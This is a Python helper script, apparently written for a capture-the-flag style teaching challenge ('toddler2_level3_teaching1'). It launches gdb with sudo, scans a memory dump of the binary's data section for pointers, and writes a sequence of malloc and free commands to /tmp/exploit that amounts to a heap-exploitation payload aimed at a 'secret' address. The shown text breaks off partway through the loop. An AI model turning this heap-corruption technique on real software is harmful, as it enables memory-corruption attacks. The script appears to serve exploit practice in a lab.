import os, mmap

def get_stored_idx(addr):
    gap = addr - stored_addr
    return gap // 4

def get_messages_idx(addr):
    gap = addr - messages_addr
    return gap // 8

def idx_stored_addr(idx):
    return stored_addr + idx * 4

def idx_messages_addr(idx):
    return messages_addr + idx * 8

def find_target():
    target_list = []
    iter_addr = offset + 0x400000
    while mm.tell() != mm.size():
        qword = mm.read(8)
        qword = int.from_bytes(qword, byteorder = 'little')
        if data_start <= qword < data_end:
            target_list.append(tuple([iter_addr, qword]))
        iter_addr += 8
    mm.seek(0)
    return target_list

os.system("sudo gdb /toddler2_level3_teaching1 -ex start")
#os.system("sudo gdb /toddler2_level2_teaching1 -ex start -ex \"dump memory /tmp/dump 0x400000 0x405000\" -ex quit")
f = open("/tmp/dump", "rb")
mm = mmap.mmap(f.fileno(), 0, prot=mmap.PROT_READ)
offset = int(input(), 16) - 0x400000
secret_addr =   offset + 0x4044b9
messages_addr = offset + 0x404040
stored_addr =   offset + 0x4040c0
data_start = offset + 0x404000
data_end = offset + 0x405000
target_addr = None

def de(addr):
    print("access %s %s" %( hex(addr), hex(idx_stored_addr(get_messages_idx(addr)))))

def backlink(m_addr):
    s = idx_stored_addr(get_messages_idx(m_addr))
    return get_messages_idx(s)

if __name__ == "__main__":
    target_list = find_target()
    exploit = open("/tmp/exploit", "wb")
    for (i,j) in target_list:
        avail = idx_stored_addr(get_messages_idx(i))
        if data_start <= avail < data_end:
            inter_addr = idx_stored_addr(get_messages_idx(i))
            inter_idx = get_messages_idx(inter_addr)
            print("ref: %s, idx %d" % (hex(i), get_messages_idx(i)))
            print("deref: %s, deref: %d" % (hex(j), get_messages_idx(j)))

            print("iter_addr: %s, idx : %d" % (hex(inter_addr), inter_idx))
            offset = 8 * 5
            exploit.write(b"malloc 0\nfree 0\n")
            exploit.write(b"malloc %d\n" % inter_idx)
            exploit.write(b"free %d\n" % inter_idx)
            exploit.write(b"malloc %d\n" % (get_messages_idx(i) + 1))
                
